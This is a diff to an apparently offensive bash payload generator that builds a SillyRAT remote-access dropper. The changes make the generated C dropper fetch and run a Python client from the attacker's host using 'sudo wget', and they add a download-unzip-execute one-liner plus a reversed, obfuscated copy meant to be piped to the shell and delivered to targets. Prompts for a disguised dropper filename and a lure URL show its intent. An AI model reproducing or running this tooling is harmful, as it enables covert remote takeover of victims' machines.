@@ -10262,7 +10262,7 @@ fi
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter AGENT|DROPPER FILENAME ☠" --text "example: Steam\nWarning: Allways Start FileNames With 'Capital Letters'" --entry --width 300) > /dev/null 2>&1
-SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
+SOSP=$(zenity --list --title "☠ Target Operative system sellection ☠" --text "Remark: Sellecting 'Cancel' or 'Mac' will not create the dropper.\nWithout the dropper the Client.py requires to be manual executed\nand it will no longer auto-install SillyRAT python3 dependencies." --radiolist --column "Pick" --column "Option" TRUE "Windows" FALSE "Linux" FALSE "Mac" --height 240) > /dev/null 2>&1
 if [ "$SOSP" = "Windows" ]; then rpath=$(zenity --title="☠ Enter Files Upload Path (target dir) ☠" --text "example: %tmp% (*)\nexample: %LocalAppData%\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Upload our files.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1;fi
 
 ## Setting default values in case user have skip this ..
@@ -10292,7 +10292,6 @@ else # Mac or multi-platforms
 fi
 
 ## Display final settings to user.
-echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
@@ -10376,7 +10375,7 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "         allowing us to continue running the Client.py in ram even if parent process its terminated." >> $Drop.c
       echo "         */" >> $Drop.c
       echo "         setsid();" >> $Drop.c
-      echo "         system(\"cd /tmp && wget -qq http://$lhost/$Drop.py && python3 $Drop.py\");" >> $Drop.c
+      echo "         system(\"cd /tmp && sudo /usr/bin/wget -qq http://$lhost/$Drop.py -O /tmp/$Drop.py && python3 $Drop.py\");" >> $Drop.c
       echo "      } return 0;" >> $Drop.c
       echo "}" >> $Drop.c
 
@@ -10422,9 +10421,21 @@ fi
 cd $IPATH
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
-echo "${BlueF}---"
-echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
-echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
+echo "${BlueF}---";echo "- ${YellowF}CHOSE ONE TECHNIC TO DELIVER DROPPER${BlueF}"
+echo "- ${YellowF}URL LINK:${BlueF} http://$lhost/MegaUpload.html"
+
+if [ "$SOSP" = "Linux" ]; then
+   ## Build 'onelinner' download/execute dropper (obfuscated)
+   original_string="sudo /usr/bin/wget -qq http://$lhost/$Drop.zip;unzip $Drop.zip;./$Drop"
+   ## Reverse original string (venom attack vector)
+   xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
+   reverse_original=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt
+   ## Display onelinner option to attacker.
+   echo "-";echo "- ${YellowF}ONELINER:"${BlueF};
+   echo "- $original_string";echo "-"
+   echo "- ${YellowF}ONELINER_OBFUSCATED:"${BlueF};
+   echo "- rev <<< \"$reverse_original\"|\$0"
+fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
 read stupidpause
